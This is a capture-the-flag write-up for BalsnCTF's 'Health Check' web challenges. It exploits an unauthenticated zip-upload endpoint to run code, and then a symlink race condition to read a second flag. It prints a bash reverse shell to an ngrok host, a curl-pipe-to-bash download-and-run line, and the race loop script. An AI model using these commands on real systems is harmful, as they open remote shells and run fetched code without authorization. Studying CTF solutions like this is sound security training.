---
layout: single
title: Health Check 1 & 2 - BalsnCTF
date: 2022-9-05
category: "Web"
desc: "Want to know whether the challenge is down or it's just your network down? Want to know who to send a message when you want to contact an admin of some challenges? Take a look at our fastest Health Check API in the world!"
---

## Challenge Description
"Want to know whether the challenge is down or it's just your network down? Want to know who to send a message when you want to contact an admin of some challenges? Take a look at our "fastest" Health Check API in the world!"


## Information
Some information about healthcheck1 and healthcheck2, these are 2 seperate challenges where you have to gain access with RCE for healthcheck 1 enumerate the file system and grab the flag. After that healthcheck 2 comes to the surface, so we got a shell and with that into web application directory(`/home/healthcheck/app`) we found 2 python files called `apiserver.py` and `background.py` with source code of the app, analyzing the source code of the `apiserver.py` at `@app.get('/{dir_name}')` route is there a opportunity for a `race contition` attack and after that grab the second flag.


## Health Check 1
A first look into web challenge we got a message `{"message":"Hello World"}` who looks like `json` format. Doing more enumeration i didnt find something worth so i try bruteforce some directories. <br>
![index](https://user-images.githubusercontent.com/45040001/188512190-3470dbe0-f726-4f73-92a1-11b802ffe06f.png)

While directory bruteforcing running the `/docs` directory appear with different `content length` <br>
![docs_dir](https://user-images.githubusercontent.com/45040001/188512230-691bfdc5-8811-4e0b-a180-b15a56e97f28.png)

When visit the `/docs` directory we found 3 interestings HTTP routes and they are: `POST /new`,`GET /{dir_name}` and the last one `GET /` <br>
![docs](https://user-images.githubusercontent.com/45040001/188512252-23eea18f-11a7-4008-b7b0-b85ed03742c8.png)
<br>

Lets enumerate these routes... Lets take the first one and open it we will find out a description which says:
<b>"This endpoint is only for admin. do NOT share this link with players!

Upload the health check script to create a new problem. The uploaded file should be a zip file. The zip file should NOT have a top-level folder, you must place an executable (or a script) named run. You may put other fiels as you want. Below is an example output of zipinfo myzip.zip of a valid myzip.zip"</b>
<br>
![admin_only](https://user-images.githubusercontent.com/45040001/188512336-edf35a77-5b7d-4bc4-bdd8-956d5aa938f3.png)

When i read `you must place an executable (or a script)` instantly i thing a bash script so i tried.<br>
![upload exploit](https://user-images.githubusercontent.com/45040001/188512694-815aa9fe-edc5-4eb4-a3d1-fd1103a1ef8a.png)

I create a zip file with a random name(`tet.zip`) and i put my `run` executable inside with the curl command sending a `GET` requst to my burpcollaborator.(bellow run executable source code) <br>
```bash
#!/bin/bash

curl http://burpcollaborator.net/
```
After a few seconds i get the request from curl command and i knew it i can get a reverse shell just putting the reverse shell into run executable but... <br>
![curl](https://user-images.githubusercontent.com/45040001/188512936-18f8d21c-d5a4-4cdd-87f0-6dcdd562b042.png)

but when i tried i had a problem.. The problem it was the URL scheme must be "http","https" so i create 2 other files.(source code below)<br>
![cors](https://user-images.githubusercontent.com/45040001/188512958-8afb1bfb-cba4-43b7-ba6a-3535130004f2.png)

<br>

The first file was the `shell.sh` where i upload it into a web server so i can reach it from the other file called `run` executable.
```bash
#!/bin/bash
# shell.sh

bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12771 0>&1
```

This source code below is the `run` executable where with the `curl` command we get the source code of `shell.sh` and pipeline it with `bash` command and successfully get the reverse shell .
```bash
#!/bin/bash
# run executable

curl http://server-to-shell.com/shell.sh|bash
```

![rev_shell](https://user-images.githubusercontent.com/45040001/188512834-833e9ba4-3db1-43de-8a8f-dc7e1ae3cd84.png) <br>

We can retrive the flag in the `__pycache__` directory.
![flag](https://user-images.githubusercontent.com/45040001/188512842-48603fcf-de87-439a-8168-dc3fcd5be75e.png)


## Health Check 2

![examine](https://user-images.githubusercontent.com/45040001/188760193-9a4b878f-9659-4dd7-864d-e0646ab7f53a.png)


```python
@app.get('/{dir_name}')
async def get_status(dir_name: str):
    file = data_path / dir_name / 'status.json'
    if not file.resolve().is_relative_to((data_path / dir_name).resolve()):
        return HTTPException(404, detail='no status')
    try:
        with open(file, 'r') as fp:
            return fp.read()
    except:
        return HTTPException(404, detail='no status')
```

![upload zip_for flag](https://user-images.githubusercontent.com/45040001/188760009-9ed5c627-b8f2-4105-b548-11f59ae5bd6a.png)

```bash
# run executable into flag.zip
while :; do ln -s /home/healthcheck/app/flag2 status.json; rm status.json; echo 'lalal' > status.json; rm status.json; done
```


![run_my_script](https://user-images.githubusercontent.com/45040001/188760071-b6c4a1d1-212c-44d4-ab9a-9a9399777a51.png)

![404](https://user-images.githubusercontent.com/45040001/188760084-ea4bb487-ce74-4944-b0ad-b29b171f238c.png)

![lalala](https://user-images.githubusercontent.com/45040001/188760090-36c82282-f3d3-4ede-9edc-6e5ff54fdc61.png)

![flag](https://user-images.githubusercontent.com/45040001/188760093-e824b6d0-d869-4148-8db6-b443521888da.png)



